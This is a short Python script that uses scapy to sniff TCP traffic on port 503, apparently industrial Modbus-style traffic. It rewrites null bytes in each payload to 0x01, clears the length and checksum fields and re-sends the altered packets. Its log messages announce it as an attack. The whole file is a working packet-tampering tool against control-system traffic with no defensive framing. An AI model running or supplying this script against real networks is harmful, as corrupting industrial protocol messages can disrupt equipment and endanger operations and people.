from scapy.all import *
import logging

logging.basicConfig(level=logging.INFO)

def packet_callback(packet):
    if packet.haslayer(IP) and packet.haslayer(TCP):
        if packet.dport == 503 or packet.sport == 503:
            logging.info(f"Packet found: {packet.summary()}")

            if packet.haslayer(Raw):
                raw_data = packet[Raw].load
                logging.info(f"Original Raw Data: {raw_data}")

                new_data = raw_data.replace(b'\x00', b'\x01')
                packet[Raw].load = new_data

                del packet[IP].len
                del packet[TCP].chksum
                send(packet, verbose=False)

                logging.info(f"Modified Packet sent: {packet.summary()}")
            else:
                logging.warning("No Raw Layer found in the packet")

    return packet

logging.info("Attack will start soon")
sniff(filter="tcp port 503", prn=packet_callback, store=0)
logging.info("Attack started")
